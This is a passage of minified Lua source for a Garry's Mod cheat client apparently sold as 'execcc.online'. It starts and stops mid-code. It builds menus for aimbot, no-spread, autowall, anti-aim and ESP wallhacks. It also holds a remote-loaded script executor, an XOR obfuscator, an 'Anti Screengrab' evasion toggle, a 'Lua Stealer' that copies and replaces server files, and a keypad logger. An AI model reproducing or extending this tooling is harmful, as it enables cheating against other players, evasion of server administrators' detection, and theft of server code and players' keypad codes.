self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;local a7=panelentityall:Add("DCheckBoxLabel")a7:SetPos(450,d3+5)a7:SetText("Spectate")a7:SetFont("hack_font_18")a7:SetTextColor(b.colortext)if t["MISC_SPECTATE_TARGET"]==dd["id"]then a7:SetValue(true)else a7:SetValue(false)end;function a7:OnChange(aR)if aR then y("MISC_SPECTATE_TARGET",dd["id"])else y("MISC_SPECTATE_TARGET","")end end;function a7.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;d3=d3+25 end end end;findentityxd("")end)end)cG(47,"Team",function()if IsInGame()then p([[local a={}for _,v in pairs(team.GetAllTeams())do a[v.Name]=true end file.Write("]]..b.aimteams..[[",util.TableToJSON(a))]])end;timer.Simple(1,function()function findentityxd(d2)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",d0)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;panelentityall.VBar.Paint=function(cJ,ac,ad)draw.RoundedBox(0,0,0,ac,ad,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d3=1;for dc,dd in pairs(util.JSONToTable(file.Read(b.aimteams,"DATA")or'[]'))do if string.find(dc,d2)then local d7=vgui.Create("DButton",panelentityall)d7:SetSize(297,25)d7:SetPos(1,d3)d7:SetText('')d7.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.SimpleText(dc,"hack_font_18",2.5,2,b.colortext)end;local df=t["TEAMLIST"]local a7=panelentityall:Add("DCheckBoxLabel")a7:SetPos(300,d3+5)a7:SetText("Ignore")a7:SetFont("hack_font_18")a7:SetTextColor(b.colortext)if df[dc]==true then a7:SetValue(true)else a7:SetValue(false)end;function a7:OnChange(aR)if aR then df[dc]=true else df[dc]=false end;y("TEAMLIST",df)end;function a7.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;d3=d3+25 end end end;findentityxd("")end)end)cG(45,"Rank",function()if IsInGame()then p([[local a={}for _,v in pairs(player.GetAll())do if not a[v:GetUserGroup()]then a[v:GetUserGroup()]=true end end file.Write("]]..b.aimranks..[[",util.TableToJSON(a))]])end;timer.Simple(1,function()function findentityxd(d2)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",d0)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;panelentityall.VBar.Paint=function(cJ,ac,ad)draw.RoundedBox(0,0,0,ac,ad,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d3=1;for dc,dd in pairs(util.JSONToTable(file.Read(b.aimranks,"DATA")or'[]'))do if string.find(dc,d2)then local d7=vgui.Create("DButton",panelentityall)d7:SetSize(297,25)d7:SetPos(1,d3)d7:SetText('')d7.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.SimpleText(dc,"hack_font_18",2.5,2,b.colortext)end;local dg=t["RANKLIST"]local a7=panelentityall:Add("DCheckBoxLabel")a7:SetPos(300,d3+5)a7:SetText("Ignore")a7:SetFont("hack_font_18")a7:SetTextColor(b.colortext)if dg[dc]==true then a7:SetValue(true)else a7:SetValue(false)end;function a7:OnChange(aR)if aR then dg[dc]=true else dg[dc]=false end;y("RANKLIST",dg)end;function a7.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;d3=d3+25 end end end;findentityxd("")end)end)d0:Hide()local a={}a.URL="https://execcc.online/hacka/account/indes.php"a.COMPILE="C"local D={["\\"]="\\\\",["\0"]="\\0",["\b"]="\\b",["\t"]="\\t",["\n"]="\\n",["\v"]="\\v",["\f"]="\\f",["\r"]="\\r",["\""]="\\\"",["\'"]="\\\'"}function a:Init()self.Code=""self.ErrorPanel=self:Add("DButton")self.ErrorPanel:SetFont('BudgetLabel')self.ErrorPanel:SetTextColor(Color(255,255,255))self.ErrorPanel:SetText("")self.ErrorPanel:SetTall(0)self.ErrorPanel.DoClick=function()self:GotoErrorLine()end;self.ErrorPanel.DoRightClick=function(self)SetClipboardText(self:GetText())end;self.ErrorPanel.Paint=function(self,E,F)surface.SetDrawColor(255,50,50)surface.DrawRect(0,0,E,F)end;self:StartHTML()end;function a:Think()if self.NextValidate and self.NextValidate<CurTime()then self:ValidateCode()end end;function a:StartHTML()self.HTML=self:Add("DHTML")self:AddJavascriptCallback("OnCode")self:AddJavascriptCallback("OnLog")self.HTML:OpenURL(self.URL)self.HTML:RequestFocus()end;function a:ReloadHTML()self.HTML:OpenURL(self.URL)end;function a:JavascriptSafe(e)e=e:gsub(".",D)e=e:gsub("\226\128\168","\\\226\128\168")e=e:gsub("\226\128\169","\\\226\128\169")return e end;function a:CallJS(w)self.HTML:Call(w)end;function a:AddJavascriptCallback(T)local ad=self[T]self.HTML:AddFunction("gmodinterface",T,function(...)ad(self,HTML,...)end)end;function a:OnCode(d,dh)self.NextValidate=CurTime()+0.2;self.Code=dh end;function a:OnLog(d,...)print(...)end;function a:SetCode(dh)self.Code=dh;self:CallJS('SetContent("'..self:JavascriptSafe(dh)..'");')end;function a:GetCode()return self.Code end;function a:SetGutterError(aO,av)self:CallJS("SetErr('"..aO.."','"..self:JavascriptSafe(av).."')")end;function a:GotoLine(di)self:CallJS("GotoLine('"..di.."')")end;function a:ClearGutter()self:CallJS("ClearErr()")end;function a:GotoErrorLine()self:GotoLine(self.ErrorLine or 1)end;function a:SetError(bU)if not IsValid(self.HTML)then self.ErrorPanel:SetText("")self:ClearGutter()return end;local ax=0;if bU then local a6,bU=string.match(bU,self.COMPILE..":(%d*):(.+)")if a6 and bU then ax=20;self.ErrorPanel:SetText(a6 and bU and"ERROR Line "..a6 ..": "..bU or bU or"")self.ErrorLine=tonumber(string.match(bU," at line (%d)%)")or a6)or 1;self:SetGutterError(self.ErrorLine,bU)end else self.ErrorPanel:SetText("")self:ClearGutter()end;local a7=self:GetWide()local a8=self:GetTall()self.ErrorPanel:SetPos(0,a8-ax)self.ErrorPanel:SetSize(a7,ax)self.HTML:SetSize(a7,a8-ax)end;function a:ValidateCode()local a9=SysTime()local dh=self:GetCode()self.NextValidate=nil;if not dh or dh==""then self:SetError()return end;local dj=CompileString(dh,self.COMPILE,false)a9=SysTime()-a9;if type(dj)=="string"then self:SetError(dj)elseif a9>0.25 then self:SetError("Compiling took too long. ("..math.Round(a9*1000)..")")else self:SetError()end end;function a:PerformLayout(E,F)local ax=self.ErrorPanel:GetTall()self.ErrorPanel:SetPos(0,F-ax)self.ErrorPanel:SetSize(E,ax)self.HTML:SetSize(E,F-ax)end;vgui.Register("lua_executer",a,"EditablePanel")local dk=vgui.Create("DFrame")dk:SetSize(650,380)dk:Center()dk:SetTitle("")dk:SetDraggable(true)dk:MakePopup()dk:ShowCloseButton(false)dk:SetSizable(true)dk.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.RoundedBox(0,0,0,ac,22,b.titlebar)draw.SimpleText("Loader","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;_.runscriptloader=vgui.Create("DButton",dk)_.runscriptloader:SetFont("hack_font_18")_.runscriptloader:SetText("Run Script")_.runscriptloader:SetTextColor(b.colortext)_.runscriptloader:SetSize(75,25)_.runscriptloader:SetToolTip("Left button - run to ClientSide, Right button - run to MenuState.")_.runscriptloader.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if _.runscriptloader.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;_.runscriptloader.DoClick=function()if IsInGame()then if _.exective.ErrorPanel:GetText()==""then p(_.exective:GetCode(),t["LUALOADER_ANTISG"])else _.exective.ErrorPanel:GotoLine(string.Explode(":",_.exective.ErrorPanel:GetText())[1]:Replace("ERROR Line ",""))_.exective.ErrorPanel:SetText("The script has errors no".."t available to run!")end end end;_.runscriptloader.DoRightClick=function()if _.exective.ErrorPanel:GetText()==""then RunString(_.exective:GetCode())else _.exective.ErrorPanel:GotoLine(string.Explode(":",_.exective.ErrorPanel:GetText())[1]:Replace("ERROR Line ",""))_.exective.ErrorPanel:SetText("The script has errors no".."t available to run!")end end;_.openfileloader=vgui.Create("DButton",dk)_.openfileloader:SetFont("hack_font_18")_.openfileloader:SetText("Save")_.openfileloader:SetTextColor(b.colortext)_.openfileloader:SetSize(50-12,25)_.openfileloader.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if _.openfileloader.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;_.openfileloader.DoClick=function()aa(200,200,function()local d1=vgui.Create("DTextEntry",doplpanel)d1:SetPos(3,30)d1:SetSize(194,25)d1:SetText("")d1.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;d1.OnTextChanged=function()if IsValid(cfgtable)then b.fcfg(d1:GetValue())end end;function b.fcfg(dl)if IsValid(cfgtable)then cfgtable:Remove()end;cfgtable=vgui.Create("DScrollPanel",doplpanel)cfgtable:SetPos(3,30+27)cfgtable:SetSize(194,100+67-27)cfgtable.Paint=function(a7,a8,a9)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)end;local dm=3;for w,x in pairs(exec_List("C:/exechack")or{})do if not x:find(".cfgexec")and x~="loginandpassword"then if x:find(dl or"")then local dn=x;a1("-",3,dm,25,25,cfgtable,function()exec_Delete("C:/exechack".."/"..x)b.fcfg()end)a1(dn,30,dm,select(1,surface.GetTextSize(dn))+10,25,cfgtable,function()_.exective:SetCode(exec_Read("C:/exechack".."/"..x))end)dm=dm+27 end end end end;a1("Create",3,3,50,25,doplpanel,function()Derma_StringRequest("add 'autorun' to lua name to activate autoload","Name","",function(T)exec_CreateDir("C:/exechack")exec_Write("C:/exechack".."/"..T..".lua",_.exective:GetCode())b.fcfg()end)end)a1("Refresh",3+50+2,3,58,25,doplpanel,b.fcfg)b.fcfg()end)end;_.lsc=vgui.Create("DButton",dk)_.lsc:SetFont("hack_font_18")_.lsc:SetText("Protect")_.lsc:SetTextColor(b.colortext)_.lsc:SetSize(67-12,25)_.lsc.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if _.lsc.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;_.lsc.DoClick=function()aa(170,21,function()au("Anti Screengrab","LUALOADER_ANTISG",3,2,doplpanel,"Use on you risk")end)end;_.obf=vgui.Create("DButton",dk)_.obf:SetFont("hack_font_18")_.obf:SetText("Obfuscate")_.obf:SetTextColor(b.colortext)_.obf:SetSize(80,25)_.obf.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if _.obf.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;_.obf.DoClick=function()if not _.exective:GetCode():find("local Q=_G;local q,w,e,r,t,y,u,i,o,p,a,s")then local function dp(m,ac)local function ay(dq)e=""for aG=1,string.len(dq)do e=e..'\\'..string.byte(dq,aG)end;return e end;math.randomseed(1/(os.clock()*1e3))function obff(dr,m)if m<=0 then return dr end;local ac=math.floor(math.random()*10000000)math.randomseed(ac)local D=string.gsub(dr,".",function(dr)return string.format("%02x",bit.bxor(string.byte(dr),math.random(0,255)))end)return obff('local Q=_G;local q,w,e,r,t,y,u,i,o,p,a,s='..ac..',"'..ay(D)..'",16,0,255,"'..ay("%x%x")..'",Q["'..ay("string")..'"]["'..ay("char")..'"],Q["'..ay("bit")..'"]["'..ay("bxor")..'"],Q["'..ay("tonumber")..'"],Q["'..ay("math")..'"]["'..ay("random")..'"],Q["'..ay("math")..'"]["'..ay("randomseed")..'"],Q["'..ay("RunString")..'"];a(q)s((w):gsub(y,function(c)return u(i(o(c,e),p(r,t)))end))',m-1)end;return obff(m,ac)end;_.exective:SetCode(dp(_.exective:GetCode(),1))end end;_.exective=vgui.Create('lua_executer',dk)_.exective:SetPos(3,24)_.exective:SetCode("")dk.PerformLayout=function(self,E,F)_.exective:SetSize(E-6,F-54)_.runscriptloader:SetPos(E-78,F-28)_.openfileloader:SetPos(3,F-28)_.lsc:SetPos(43,F-28)_.obf:SetPos(100,F-28)end;dk:Hide()GetAPIManifest(function(ds)local ds=util.JSONToTable(ds)if ds then b.shitnews=util.TableToJSON(ds.News and ds.News.Blogs or{})end end)local dt=vgui.Create("DFrame")dt:SetSize(500-34,300)dt:Center()dt:SetTitle("")dt:MakePopup()dt:ShowCloseButton(false)dt.Paint=function(a7,a8,a9)draw.RoundedBox(0,0,0,a8,a9,b.windowbg)draw.RoundedBox(0,0,0,a8,22,b.titlebar)draw.SimpleText("execcc.online","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,52,a8-6,a9-55)end;local du=3;local function dv(cH,M,z)a1(M,du,25,cH,25,dt,z)du=du+cH+2 end;dv(57,"Aimbot",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dt)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a7,a8,a9)draw.SimpleText("Main","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,224,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,230,a9-6)draw.SimpleText("Anti Aim","hack_font_16",238,6,b.colortext2)draw.RoundedBox(0,238,23,216,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(235,3,222,a9-50-16)draw.SimpleText("Visualization","hack_font_16",238,204-17,b.colortext2)draw.RoundedBox(0,238,204,216,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(235,184,222,42+16)draw.SimpleText("Key","hack_font_18",5,142,b.colortext)draw.SimpleText("Fov","hack_font_18",5,185,b.colortext)draw.SimpleText("Smooth","hack_font_18",5,212,b.colortext)end;surface.SetFont("hack_font_18")au("Enabled","AIM_ENABLED",6,25+17*1-17,tableselect,"Enables the aimbot")au("Silent","AIM_SILENT",6,25+17*1,tableselect)au("NoSpread","AIM_NOSPREAD",6,25+17*2,tableselect,"Engine prediction + CurCone(CommandNumber)")au("NoRecoil","AIM_NORECOIL",6,25+17*3,tableselect,"GetPunchAngle")au("AutoFire","AIM_AUTOFIRE",6,25+17*4,tableselect,"Automatatically fires the weapon")au("AutoReload","AIM_AUTORELOAD",6,25+17*5,tableselect)au("AutoWall","AIM_AUTOWALL",6,25+17*6,tableselect,"Makes the aimbot aim at people through penetratable surfaces(M9K, FAS:2, TFA)")aE("Key","AIM_KEY",6,161,36,tableselect)an(tableselect,0,360,"AIM_FOV",-119,195,300)an(tableselect,0,40,"AIM_SMOOTHING",-119,222,300)aj(109,26,"AIM_HITBOX",{"Head","Body","Hitscan"},"Hitbox",tableselect)aj(109,26+22,"AIM_PRIORITY",{"Closest Distance","Least Health","Field of View"},"Priority",tableselect)au("Aim on NPC","AIM_NPC",109,47+22,tableselect,"Makes the aimbot aim at npc")aI("AutoPistol Key",109,65+22,tableselect)aE("Key","MISC_AUTOPISTOL",109,82+22,0,tableselect)aI("TriggerBot Key",109,65+42+22,tableselect)aE("Key","TRIGGERBOT_KEY",109,82+42+22,0,tableselect)au("Enabled","ANTIAIM_ENABLED",238,25+17*1-17,tableselect)aj(238,25+17*1+1,"ANTIAIM_X",{"Up","Down","Jitter","Emotion"},"Emotion X")local dw=vgui.Create("DPanel",tableselect)dw:SetPos(232,57+2)dw:SetSize(270,30)dw.Paint=function()end;an(dw,50,100,"ANTIAIM_EMOTION_X",-98,0,250)aj(238,79,"ANTIAIM_Y",{"Forward","Backwards","Jitter","TJitter","Sideways","Emotion","Static"},"Emotion Y")local dw=vgui.Create("DPanel",tableselect)dw:SetPos(232,95)dw:SetSize(270,30)dw.Paint=function()end;an(dw,20,100,"ANTIAIM_EMOTION_Y",-98,0,250)au("Resolver","RESOLVER",238,114,tableselect)a1("..",238+129,115,15,15,tableselect,function()aa(127,48,function()aj(3,3,"RESOLVER_X_AXIS",{"Off","Down","Up","Center","Invert","Random","Auto"},"Axis X")aj(3,3+22,"RESOLVER_Y_AXIS",{"Off","Left","Right","Invert","Random","Auto"},"Axis Y")end)end)au("Hitsound","HITSOUNDS",238,114+17,tableselect)au("Fov Circle","AIM_DRAWFOV",238,211-5,tableselect)a1("..",238+129,211-5+1,15,15,tableselect,function()aa(127,156,function()ak("WH_FOV_COLOR",3,3)end)end)au("Snapline","WH_SNAPLINE",238,211-5+17,tableselect)a1("..",238+129,211-5+17+1,15,15,tableselect,function()aa(127,156,function()ak("WH_SNAPLINE_COLOR",3,3)end)end)end)dv(50,"Visual",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dt)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a7,a8,a9)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,150,a9-6)draw.SimpleText("Player","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,144,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(155,3,150,a9-6)draw.SimpleText("Entity","hack_font_16",158,6,b.colortext2)draw.RoundedBox(0,158,23,150-6,1,b.border)draw.SimpleText("Other","hack_font_16",310,6,b.colortext2)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(307,3,150,a9-6)draw.RoundedBox(0,310,23,150-6,1,b.border)end;a1("..",135,6,15,15,tableselect,function()aa(150,200,function()an(doplpanel,100,20000,"WH_DISTANCE",-101,-3,250,"Distance")au("Dormant","WH_DORMANT",3,16,doplpanel)surface.SetFont("hack_font_18")local aK=vgui.Create("DButton",doplpanel)aK:SetSize(select(1,surface.GetTextSize("Friend")),15)aK:SetPos(2,3+29)aK:SetFont("hack_font_18")aK:SetText("Friend")aK:SetTextColor(b.colortext)aK.Paint=function()end;ak("WH_FRIENDCOLOR",3,16+31)end)end)au("Name","WH_NAME",6,25,tableselect,"Show player's name on ESP")a1("..",135,26,15,15,tableselect,function()aa(127,178+22-5,function()au("Friend Color","WH_NAME_FRIENDCOLOR",3,2,doplpanel)ae(3,20,"WH_NAME_POSITION")ak("WH_NAME_COLOR",3,25+22-5)end)end)au("Rank","WH_USERGROUP",6,25+17*1,tableselect,"Show player's rank on ESP")a1("..",135,25+17*1+1,15,15,tableselect,function()aa(127,178,function()ae(3,3,"WH_USERGROUP_POSITION")ak("WH_USERGROUP_COLOR",3,25)end)end)au("Team","WH_JOB",6,25+17*2,tableselect,"Show player's team on ESP")a1("..",135,25+17*2+1,15,15,tableselect,function()aa(127,26,function()ae(3,3,"WH_JOB_POSITION")end)end)au("Money","WH_MONEY",6,25+17*3,tableselect,"Show player's money(darkrp) on ESP")a1("..",135,25+17*3+1,15,15,tableselect,function()aa(127,178,function()ae(3,3,"WH_MONEY_POSITION")ak("WH_MONEY_COLOR",3,25)end)end)au("Weapon","WH_WEAPON",6,25+17*4,tableselect,"Show player's weapons on ESP")a1("..",135,25+17*4+1,15,15,tableselect,function()aa(127,201+18,function()ae(3,3,"WH_WEAPON_POSITION")aj(3,25,"WH_WEAPON_TYPETYPE",{"Only active","All"})au("Show Clip","WH_WEAPON_SHOWCLIP",3,47,doplpanel)ak("WH_WEAPON_COLOR",3,47+18)end)end)au("Health","WH_HEALTH",6,25+17*5,tableselect,"Show player's health ammount on ESP")a1("..",135,25+17*5+1,15,15,tableselect,function()aa(127,48,function()ae(3,3,"WH_HEALTH_POSITION")aj(3,25,"WH_HEALTH_TYPETYPE",{"Text","Bar","Text + Bar"})end)end)au("Armor","WH_ARMOR",6,25+17*6,tableselect,"Show player's armor ammount on ESP")a1("..",135,25+17*6+1,15,15,tableselect,function()aa(127,48,function()ae(3,3,"WH_ARMOR_POSITION")aj(3,25,"WH_ARMOR_TYPETYPE",{"Text","Bar","Text + Bar"})end)end)au("Box","WH_BOX",6,25+17*7,tableselect,"Draw a bounding box around the player")a1("..",135,25+17*7+1,15,15,tableselect,function()aa(127,200+22+10-14,function()au("Friend Color","WH_BOX_FRIENDCOLOR",3,2,doplpanel)aj(3,3+17,"WH_BOX_TYPETYPE",{"2d","3d","Corner","2d fat","Corner fat"})aj(3,25+17,"WH_BOX_TYPECOLOR",{"Custom","Job"},"Color")ak("WH_BOX_COLOR",3,47+17+25-11-14)end)end)au("Chams","WH_CHAMS",6,25+17*8,tableselect,"Applies chams material to the player")a1("..",135,25+17*8+1,15,15,tableselect,function()aa(127,200,function()aj(3,3,"WH_CHAMS_TYPE",{"XYZ","Textured","Flat","Wireframe"})aj(3,25,"WH_CHAMS_COLORTYPE",{"Custom","Team"},"Color")ak("WH_CHAMS_COLOR",3,47)end)end)au("Skeleton","WH_SKELETON",6,25+17*9,tableselect,"Draw the player's bone structure")a1("..",135,25+17*9+1,15,15,tableselect,function()aa(127,178,function()aj(3,3,"WH_SKELETON_COLORTYPE",{"Custom","Team"},"Color")ak("WH_SKELETON_COLOR",3,25)end)end)au("Hitbox","WH_HITBOX",6,25+17*10,tableselect,"Draw the player's hitboxs")a1("..",135,25+17*10+1,15,15,tableselect,function()aa(127,178,function()aj(3,3,"WH_HITBOX_COLORTYPE",{"Custom","Team"},"Color")ak("WH_HITBOX_COLOR",3,25)end)end)a1("..",287,6,15,15,tableselect,function()aa(150,35,function()an(doplpanel,100,20000,"WH_ENTITY_DISTANCE",-101,-3,250,"Distance")au("Dormant","WH_ENTITY_DORMANT",3,27-11,doplpanel)end)end)au("Name","WH_ENTITY_NAME",158,25+17*1-17,tableselect,"Show entity's name on ESP")a1("..",287,25+17*1+1-17,15,15,tableselect,function()aa(127,153+3+27-5+17,function()au("Details","WH_ENTITY_NAME_DETAILS",3,2,doplpanel,"Health, Moneys in printer, ent owner")aj(3,3+17,"WH_ENTITY_NAME_COLORTYPE",{"Custom","Entity"},"Color")ak("WH_ENTITY_NAME_COLOR",3,3+27+17-5)end)end)au("Box","WH_ENTITY_BOX",158,25+17*1,tableselect,"Draw a bounding box around the entity")a1("..",287,25+17*1+1,15,15,tableselect,function()aa(127,178+22,function()aj(3,3,"WH_ENTITY_BOX_TYPE",{"2d","3d"})aj(3,3+22,"WH_ENTITY_BOX_COLORTYPE",{"Custom","Entity"},"Color")ak("WH_ENTITY_BOX_COLOR",3,25+22)end)end)au("Chams","WH_ENTITY_CHAMS",158,25+17*2,tableselect,"Applies chams material to the entity")a1("..",287,25+17*2+1,15,15,tableselect,function()aa(127,200-22,function()aj(3,3,"WH_ENTITY_CHAMS_TYPE",{"XYZ","Textured","Flat","Wireframe"})ak("WH_ENTITY_CHAMS_COLOR",3,47-22)end)end)au("CrossHair","CROSSHAIR_ENABLED",310,25+17*1-17,tableselect,"Draw a custom crosshair")a1("..",310+129,25+17*1+1-17,15,15,tableselect,function()aa(127,221+27,function()a1("Custom",3,3,66,25,doplpanel,aL)au("CrossHair","CROSSHAIR_CROSSHAIR",3,2+27,doplpanel)au("Circle","CROSSHAIR_FOV",3,2+17+27,doplpanel)au("Box","CROSSHAIR_BOX",3,36+27,doplpanel)an(doplpanel,1,50,"CROSSHAIR_SIZE",-101,48+27,250,"Size")ak("CROSSHAIR_COLOR",3,68+27)end)end)au("FullBright","WH_FULLBRIGHT",310,25+17*1,tableselect,"Remove shadows")au("NoSky","WH_NOSKY",310,25+17*2,tableselect,"Change color sky")a1("..",310+129,25+17*2+1,15,15,tableselect,function()aa(127,156,function()ak("WH_NOSKY_COLOR",3,3)end)end)au("Transparent w","WH_TRANSPARENT_WALLS",310,25+17*3,tableselect)a1("..",310+129,25+17*3+1,15,15,tableselect,function()aa(150,45,function()aE("Key","WH_TRANSPARENT_WALLS_KEY",3,3,36,doplpanel)an(doplpanel,0,0.9,"WH_TRANSPARENT_WALLS_TRA",-101,24,250)end)end)au("W Chams","WH_VMCHAMS",310,25+17*4,tableselect)a1("..",310+129,25+17*4+1,15,15,tableselect,function()aa(127,156,function()ak("WH_VMCHAMS_COLOR",3,3)end)end)au("Cursor Entity","WH_CURSORENTITYNAME",310,25+17*5,tableselect,"Show cursor entity's name")a1("..",310+129,25+17*5+1,15,15,tableselect,function()aa(127,156,function()ak("WH_CURSORENTITYNAME_COLOR",3,3)end)end)au("No Sway","NOSWAY",310,25+17*6,tableselect,"Visual no recoil")au("Fov view","WH_FOVVIEW_ENABLED",310,25+17*7,tableselect)a1("..",310+129,25+17*7+1,15,15,tableselect,function()aa(150,18,function()an(doplpanel,70,159,"WH_FOVVIEW",-101,-3,250,"Fov")end)end)au("Debug Camera","WH_DEBUGCAMERA_ENABLED",310,25+17*8,tableselect)a1("..",310+129,25+17*8+1,15,15,tableselect,function()aa(150,45,function()aE("Key","WH_DEBUGCAMERA_KEY",3,3,36,doplpanel)an(doplpanel,0.010999999664724,0.044999999664724,"WH_DEBUGCAMERA_SPEED",-101,24,250,"Speed")end)end)au("ThirdPerson","WH_THIRDPERSON_ENABLED",310,25+17*9,tableselect)a1("..",310+129,25+17*9+1,15,15,tableselect,function()aa(150,45,function()aE("Key","WH_THIRDPERSON_KEY",3,3,36,doplpanel)an(doplpanel,70,300,"WH_THIRDPERSON_DISTANCE",-101,24,250,"Distance")end)end)au("Filter","FILTER_ENABLED",310,25+17*10,tableselect)a1("..",310+129,25+17*10+1,15,15,tableselect,function()aa(150,46,function()an(doplpanel,0,1,"FILTER_BRIGHTNESS",-101,-3,250,"Brightness")an(doplpanel,0,5,"FILTER_CONTRAST",-101,11,250,"Contrast")an(doplpanel,0,5,"FILTER_SATURATION",-101,25,250,"Saturation")end)end)end)dv(41,"Misc",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dt)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a7,a8,a9)draw.SimpleText("Main","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,448,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,454,a9-6)end;au("Bunnyhop","MISC_BUNNYHOP",6,25+17*1-17,tableselect)au("AutoStrafe","MISC_AUTOSTRAFE",6,25+17*1,tableselect)au("CircleStrafe","CIRCLESTRAFE",6,25+17*2,tableselect)a1("..",135,25+17*2+1,15,15,tableselect,function()aa(150,45-14,function()aE("Key","CIRCLESTRAFE_KEY",3,3,36,doplpanel)end)end)au("Lua Stealer","LUA_FILE_STEALER",6,25+17*3,tableselect,"Save server files to dir: ".."C:/exechack")a1("..",135,25+17*3+1,15,15,tableselect,function()aa(150,17+4,function()au("Replace","LUA_FILE_STEALER_REPLACE",3,2,doplpanel,"Replace original code to you")end)end)au("Afk mode","MISC_ANTIANTIAFK",6,25+17*4,tableselect,"Bypass anti-afk")au("Save Mode","SAVEMODE",6,25+17*5,tableselect,"Alow load only addons",j)au("Keypad logger","MISC_KEYPADLOGGER",6,25+17*6,tableselect,"no".."t support keypad with secure mode")a1("..",135,25+17*6+1,15,15,tableselect,function()aa(137,156+15,function()an(doplpanel,1000,20000,"MISC_KEYPADLOGGER_DISTANCE",-101,-3,250,"Distance")ak("MISC_KEYPADLOGGER_COLOR",3,17)end)end)au("FlashLight","MISC_FLASHSPAM",6,25+17*7,tableselect,"Spam FlashLight")end)dv(51,"Config",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dt)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a7,a8,a9)draw.SimpleText("List","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,448,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,454,a9-6)end;surface.SetFont("hack_font_18")local function aq()if IsValid(cfgtable)then 